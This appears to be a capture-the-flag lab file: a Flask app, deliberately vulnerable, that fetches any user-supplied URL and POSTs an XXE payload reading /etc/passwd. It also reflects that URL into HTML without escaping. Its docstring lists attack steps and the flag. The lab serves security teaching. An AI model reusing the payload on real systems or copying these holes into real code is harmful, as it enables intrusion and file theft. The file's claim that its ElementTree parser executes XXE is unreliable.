"""
SSRF Lab 18: SSRF to XXE via SSRF
Difficulty: 4 (Expert)
Points: 150

Description:
SSRF triggering XXE vulnerability.
"""

from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def index():
    """
    VULNERABLE: SSRF to XXE endpoint
    
    Attack Vector:
    1. Vulnerable XML parser on internal service
    2. SSRF to internal service with XXE payload
    3. /?url=http://localhost:8000/parse
    4. POST body contains XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
    
    Or chain:
    1. Upload file via SSRF: /?url=http://internal:8080/upload
    2. Upload contains XXE payload
    3. Internal service processes file and executes XXE
    
    Flag: FLAG{ssrf_to_xxe_018}
    """
    url = request.args.get('url', '')
    content = None
    error = None
    
    if url:
        try:
            xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<foo>&xxe;</foo>'''
            
            response = requests.post(url, data=xxe_payload, timeout=5, headers={'Content-Type': 'application/xml'})
            content = response.text[:1000]
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>SSRF to XXE Lab</h1>
        <form method="GET">
            <input type="text" name="url" placeholder="XXE Vulnerable Service URL" size="70" value="{url}">
            <button>Trigger XXE</button>
        </form>
        {f"<pre>{content}</pre>" if content else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

@app.route('/xxe', methods=['POST'])
def xxe_endpoint():
    """Vulnerable XML parser endpoint"""
    import xml.etree.ElementTree as ET
    try:
        data = request.data
        ET.fromstring(data)
        return "XML parsed (XXE likely executed)"
    except:
        return "Error parsing XML"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5018, debug=False)
